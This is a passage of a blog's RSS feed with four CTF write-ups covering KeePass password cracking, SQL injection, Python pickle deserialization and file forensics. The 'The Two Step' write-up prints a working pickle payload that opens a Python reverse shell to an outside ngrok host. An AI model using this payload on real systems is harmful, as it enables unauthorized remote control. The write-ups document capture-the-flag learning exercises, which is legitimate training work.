+&lt;/ol></description></item><item><title>KeepJohn</title><link>https://qiaonpc.github.io/post/keepjohn/</link><pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/keepjohn/</guid><description>&lt;h1 id="cryptography-ctf-challenge-writeup">Cryptography CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: KeepJohn&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 1&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Cryptography&lt;/li>
+&lt;/ul>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>Initially, I thought to use &lt;strong>keepass2john&lt;/strong> and then crack the password using &lt;strong>John the Ripper&lt;/strong>, but none of the passwords in the provided wordlist matched.&lt;/p>
+&lt;ul>
+&lt;li>Even after trying the entire &lt;strong>rockyou&lt;/strong> wordlist, it didn’t work.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Upon re-reading the challenge description, I realized it mentioned &lt;strong>variations of commonly used passwords&lt;/strong>.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Remembering John Hammond’s video on a tool that generates variations of passwords, I used &lt;strong>Munge&lt;/strong> (a tool designed for this purpose): &lt;a class="link" href="https://github.com/Th3S3cr3tAg3nt/Munge" target="_blank" rel="noopener"
+>Munge GitHub&lt;/a>.&lt;/p>
+&lt;ul>
+&lt;li>Maybe the John in the challenge refers to John Hammond? &lt;a class="link" href="https://www.youtube.com/watch?v=nNvhK1LUD48&amp;amp;t=608s" target="_blank" rel="noopener"
+>John Hammond Video&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>I generated a list of passwords using Munge, and this helped me find the correct password.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/keepjohn/found%20password.png"
+width="1359"
+height="257"
+srcset="https://qiaonpc.github.io/post/keepjohn/found%20password_hu3fc71f5f7fe126b41b576f08aeb90d5e_121512_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/keepjohn/found%20password_hu3fc71f5f7fe126b41b576f08aeb90d5e_121512_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Found Password"
+class="gallery-image"
+data-flex-grow="528"
+data-flex-basis="1269px"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>After opening the &lt;strong>kdbx&lt;/strong> file with the found password, I retrieved the flag.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/keepjohn/flag.png"
+width="1364"
+height="389"
+srcset="https://qiaonpc.github.io/post/keepjohn/flag_hufd0c90f4d0ebd14e1a03ee872020a0c7_35372_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/keepjohn/flag_hufd0c90f4d0ebd14e1a03ee872020a0c7_35372_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Found Flag"
+class="gallery-image"
+data-flex-grow="350"
+data-flex-basis="841px"
+>&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="flag">Flag
+&lt;/h2>&lt;p>FSIIECTF{XXXXXXXXXX}&lt;/p></description></item><item><title>My First Blog</title><link>https://qiaonpc.github.io/post/my-first-blog/</link><pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/my-first-blog/</guid><description>&lt;h1 id="my-first-blog-ctf-challenge-writeup">My First Blog CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: My First Blog&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 1&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Web&lt;/li>
+&lt;li>&lt;strong>Objective&lt;/strong>: Exploit an SQL injection vulnerability to retrieve admin credentials and obtain the flag.&lt;/li>
+&lt;/ul>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;p>To solve the &amp;ldquo;My First Blog&amp;rdquo; challenge, follow these steps:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Identifying the Vulnerability&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>The challenge hints at an SQL injection vulnerability.&lt;/li>
+&lt;li>Direct use of SQLmap is not possible, so manual enumeration is necessary.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Initial Enumeration&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Perform basic enumeration to identify potential SQL errors and found that it might be an SQLite database&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/my-first-blog/potential%20sqlite.png"
+width="1248"
+height="370"
+srcset="https://qiaonpc.github.io/post/my-first-blog/potential%20sqlite_hu1f266b76824c838c35227ddd7931513f_52486_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/my-first-blog/potential%20sqlite_hu1f266b76824c838c35227ddd7931513f_52486_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Potential SQLite"
+class="gallery-image"
+data-flex-grow="337"
+data-flex-basis="809px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>SQL Injection Exploration&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Test for SQL injection vulnerabilities by injecting payloads into input fields or URL parameters.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Use basic UNION-based SQL injection techniques to determine the number of columns in the SQL queries.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/my-first-blog/enumerate%20the%20columns.png"
+width="1589"
+height="404"
+srcset="https://qiaonpc.github.io/post/my-first-blog/enumerate%20the%20columns_hu2fa1dbeaf9d04526d3f140b65dbf7799_89920_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/my-first-blog/enumerate%20the%20columns_hu2fa1dbeaf9d04526d3f140b65dbf7799_89920_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Enumerate Columns"
+class="gallery-image"
+data-flex-grow="393"
+data-flex-basis="943px"
+>&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/my-first-blog/found%20number%20of%20columhns.png"
+width="1608"
+height="507"
+srcset="https://qiaonpc.github.io/post/my-first-blog/found%20number%20of%20columhns_hu89c00f66d7c4f861c6ae68bab11faec2_92614_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/my-first-blog/found%20number%20of%20columhns_hu89c00f66d7c4f861c6ae68bab11faec2_92614_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Found Number of Columns"
+class="gallery-image"
+data-flex-grow="317"
+data-flex-basis="761px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Finding Tables&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Once the number of columns is identified, proceed with UNION-based queries to list tables.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Identify a table named &lt;code>users&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/my-first-blog/find%20table.png"
+width="1595"
+height="505"
+srcset="https://qiaonpc.github.io/post/my-first-blog/find%20table_hu895923f192f613c5fe571045d0df3f2d_119606_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/my-first-blog/find%20table_hu895923f192f613c5fe571045d0df3f2d_119606_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Found Table"
+class="gallery-image"
+data-flex-grow="315"
+data-flex-basis="758px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Enumerating Columns&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Enumerate the columns in the &lt;code>users&lt;/code> table to find useful information.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Identify columns such as &lt;code>id&lt;/code>, &lt;code>username&lt;/code>, &lt;code>password&lt;/code>, &lt;code>email&lt;/code>, and &lt;code>role&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/my-first-blog/find%20columns.png"
+width="1441"
+height="458"
+srcset="https://qiaonpc.github.io/post/my-first-blog/find%20columns_hudd8680ead52b82e6399963bed8aa6148_73599_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/my-first-blog/find%20columns_hudd8680ead52b82e6399963bed8aa6148_73599_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Found Columns"
+class="gallery-image"
+data-flex-grow="314"
+data-flex-basis="755px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Retrieving Admin Credentials&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Extract the credentials of the admin user from the &lt;code>users&lt;/code> table.&lt;/li>
+&lt;li>Use SQL injection to retrieve and view the admin credentials.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Flag Retrieval&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Submit the retrieved admin credentials as the flag in the format &lt;code>FSIIECTF{XXXXXXXXXX}&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/my-first-blog/found%20flag.png"
+width="1629"
+height="647"
+srcset="https://qiaonpc.github.io/post/my-first-blog/found%20flag_hu8603e4d8fd9d5bc015d93dd3d0b7f898_151634_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/my-first-blog/found%20flag_hu8603e4d8fd9d5bc015d93dd3d0b7f898_151634_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="251"
+data-flex-basis="604px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol></description></item><item><title>The Two Step</title><link>https://qiaonpc.github.io/post/the-two-step/</link><pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/the-two-step/</guid><description>&lt;h1 id="the-two-step-ctf-challenge-writeup">The Two Step CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: The Two Step&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 1&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Web&lt;/li>
+&lt;li>&lt;strong>Objective&lt;/strong>: Exploit insecure deserialization to gain shell access and retrieve the flag.&lt;/li>
+&lt;/ul>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;p>To solve the &amp;ldquo;The Two Step&amp;rdquo; challenge, follow these steps:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Initial Analysis&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Upon visiting the website, the initial impression might be a redirect vulnerability, but further inspection shows it&amp;rsquo;s not the case.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/the-two-step/potential%20redirect%20vuln.png"
+width="1709"
+height="860"
+srcset="https://qiaonpc.github.io/post/the-two-step/potential%20redirect%20vuln_hu534c032bc4226b59db0c382518263bf5_90177_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/the-two-step/potential%20redirect%20vuln_hu534c032bc4226b59db0c382518263bf5_90177_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Potential Redirect Vuln"
+class="gallery-image"
+data-flex-grow="198"
+data-flex-basis="476px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Identifying Insecure Deserialization&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Inspect the source code and identify that it uses Python&amp;rsquo;s pickle module for deserialization.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Note that deserialization is insecurely handled, allowing for arbitrary code execution if exploited correctly.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/the-two-step/source%20code.png"
+width="1478"
+height="856"
+srcset="https://qiaonpc.github.io/post/the-two-step/source%20code_huc67a06df4f08313558ae2e3033596545_137544_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/the-two-step/source%20code_huc67a06df4f08313558ae2e3033596545_137544_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Source COde"
+class="gallery-image"
+data-flex-grow="172"
+data-flex-basis="414px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Crafting the Payload&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Attempt to use standard pickle payloads. Initial attempts may only return numbers or unintended outputs.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/the-two-step/tried%20simple%20pickle%20payload.png"
+width="1543"
+height="595"
+srcset="https://qiaonpc.github.io/post/the-two-step/tried%20simple%20pickle%20payload_hu04ea316c70be6a31cec057843ad2dbb6_87585_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/the-two-step/tried%20simple%20pickle%20payload_hu04ea316c70be6a31cec057843ad2dbb6_87585_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Simple Pickle Payload"
+class="gallery-image"
+data-flex-grow="259"
+data-flex-basis="622px"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Instead, craft a payload designed to spawn a shell. Initially tried a simple &lt;code>nc&lt;/code> shell, but it didnt work, maybe &lt;code>nc&lt;/code> is blocked&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Using an Alternative Shell&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>Since &lt;code>nc&lt;/code> may not be executable, use a Python-based reverse shell to establish a connection.&lt;/li>
+&lt;li>Example Python reverse shell payload:
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">import&lt;/span> &lt;span class="nn">pickle&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nn">os&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="nn">base64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">class&lt;/span> &lt;span class="nc">P&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">object&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">__reduce__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;python3 -c &amp;#39;import os,pty,socket;s=socket.socket();s.connect((&amp;#34;0.tcp.ap.ngrok.io&amp;#34;,13278));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; &amp;#39;&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pickle&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dumps&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">P&lt;/span>&lt;span class="p">())))&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Gaining Shell Access&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Send the crafted payload to the server to get a reverse shell.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Once you have shell access, escalate privileges if necessary. Since you’re already root, you should be able to retrieve the flag.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/the-two-step/reverse%20shell.png"
+width="1090"
+height="163"
+srcset="https://qiaonpc.github.io/post/the-two-step/reverse%20shell_hu4de6d867c2068ea8db2c004de90cd585_26033_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/the-two-step/reverse%20shell_hu4de6d867c2068ea8db2c004de90cd585_26033_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Shell"
+class="gallery-image"
+data-flex-grow="668"
+data-flex-basis="1604px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Flag Retrieval&lt;/strong>:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>With root access, locate and read the flag file.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/the-two-step/flag.png"
+width="1199"
+height="370"
+srcset="https://qiaonpc.github.io/post/the-two-step/flag_hud54a621aceb4dedc0518019faef18606_73727_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/the-two-step/flag_hud54a621aceb4dedc0518019faef18606_73727_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="324"
+data-flex-basis="777px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol></description></item><item><title>USBChall</title><link>https://qiaonpc.github.io/post/usbchall/</link><pubDate>Sun, 08 Sep 2024 00:00:00 +0000</pubDate><guid>https://qiaonpc.github.io/post/usbchall/</guid><description>&lt;h1 id="forensics-ctf-challenge-writeup">Forensics CTF Challenge Writeup
+&lt;/h1>&lt;h2 id="challenge-information">Challenge Information
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Name&lt;/strong>: USBChall&lt;/li>
+&lt;li>&lt;strong>Points&lt;/strong>: 1&lt;/li>
+&lt;li>&lt;strong>Category&lt;/strong>: Forensics&lt;/li>
+&lt;/ul>
+&lt;h2 id="solution">Solution
+&lt;/h2>&lt;ol>
+&lt;li>
+&lt;p>I started by running the &lt;strong>file&lt;/strong> command on the given mysterious file.&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>It identified the file as a &lt;strong>Linux file system&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/usbchall/enumeration.png"
+width="1227"
+height="73"
+srcset="https://qiaonpc.github.io/post/usbchall/enumeration_hue58b4f90ce3568ae27d66ba60c5df8a5_4257_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/usbchall/enumeration_hue58b4f90ce3568ae27d66ba60c5df8a5_4257_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Enumeration"
+class="gallery-image"
+data-flex-grow="1680"
+data-flex-basis="4033px"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>I used &lt;strong>foremost&lt;/strong> to extract the files from the system.&lt;/p>
+&lt;ul>
+&lt;li>Only two files were extracted: a &lt;strong>docx&lt;/strong> file and an &lt;strong>image&lt;/strong>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>The contents of both the &lt;strong>docx&lt;/strong> and the &lt;strong>image&lt;/strong> seemed empty and provided no useful information.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>I then used &lt;strong>exiftool&lt;/strong> on the image, and this revealed the flag.&lt;/p>
+&lt;p>&lt;img src="https://qiaonpc.github.io/post/usbchall/flag.png"
+width="957"
+height="200"
+srcset="https://qiaonpc.github.io/post/usbchall/flag_hu67478114379dc6e9feddeb5166650748_9396_480x0_resize_box_3.png 480w, https://qiaonpc.github.io/post/usbchall/flag_hu67478114379dc6e9feddeb5166650748_9396_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Flag"
+class="gallery-image"
+data-flex-grow="478"
+data-flex-basis="1148px"
+>&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="flag">Flag
+&lt;/h2>&lt;p>FSIIECTF{XXXXXXXXXX}&lt;/p></description></item></channel></rss>
